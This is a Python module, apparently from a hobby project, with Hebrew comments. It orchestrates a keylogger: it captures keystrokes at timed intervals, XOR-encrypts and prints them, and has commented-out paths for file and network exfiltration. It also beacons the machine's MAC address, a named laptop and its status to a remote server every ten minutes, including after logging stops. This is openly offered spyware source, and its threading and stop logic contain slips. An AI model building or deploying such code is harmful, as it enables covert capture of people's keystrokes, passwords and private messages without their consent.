import time
import datetime
import threading
import uuid
from key_logger import KeyLogger
from FileWriter import FileWriter
from encryption import Encryption
from api_server import RequestManager


class Manager:

    def __init__(self, timeLimit=0, storageLocation="json", time_wright=60):
        self.time_wright = time_wright
        self.keylogger = KeyLogger()
        self.file_writer = FileWriter()
        self.encryption = Encryption(5)
        self.running = False
        self.storageLocation = storageLocation
        self.timeLimit = timeLimit
        self.keep_reporting = True  # דגל שימשיך לדווח גם לאחר שהפסיק את הקילוג

    def collect_keys(self):
        start_time = time.time()
        while self.running:
            try:
                time.sleep(self.time_wright)
                logged_keys = self.keylogger.get_logged_keys()
                if logged_keys:
                    timestamp = datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
                    data = {timestamp: logged_keys}
                    encrypted_data = self.encryption.xor_encrypt_decrypt_dict_list(self.storageLocation, data)
                    print(encrypted_data)

                    # if self.storageLocation == "json":
                    #     self.file_writer.Writes_to_file(encrypted_data)                    #
                    # elif self.storageLocation == "network":
                    #     pass  # שליחה לרשת (לא מוגדר כרגע)

                    self.keylogger.clear_buffer()
                threading.Thread(target=self.report_status_loop, daemon=True).start()  # הפעל דיווח קבוע

                # אם יש מגבלת זמן והזמן עבר, הפסיק את ההקלטה
                if self.timeLimit > 0 and time.time() - start_time >= self.timeLimit:
                    self.stop()
                    self.server_status_update("false")

            except Exception as e:
                print(f"Error collecting keystrokes: {e}")

    def server_status_update(self, connected):
        mac_address = ':'.join(f'{(uuid.getnode() >> i) & 0xff:02x}' for i in range(0, 48, 8))
        status = {
            "macAddress": mac_address,
            "name": "מחשב נייד של דני",
            "connected": connected,
            "timeLimit": self.timeLimit,
            "storageLocation": self.storageLocation,
            "lastSeen": datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
        }
        RequestManager().handle_request('POST', "status", status)

    def report_status_loop(self):
        while self.keep_reporting:
            RequestManager().handle_request(method='POST')
            time.sleep(600)  # המתן 10 דקות לפני הדיווח הבא

    def start(self):
        self.running = True
        self.keylogger.start_logging()
        threading.Thread(target=self.collect_keys, daemon=True).start()
        self.server_status_update("true")
        self.collect_keys()

    def stop(self):
        self.running = False
        self.keylogger.stop_logging()
        self.keep_reporting = True  # המשך לדווח לשרת


if __name__ == '__main__':
    a = Manager(timeLimit=180, time_wright=30)  # דוגמה להפעלה עם מגבלת זמן
    a.start()
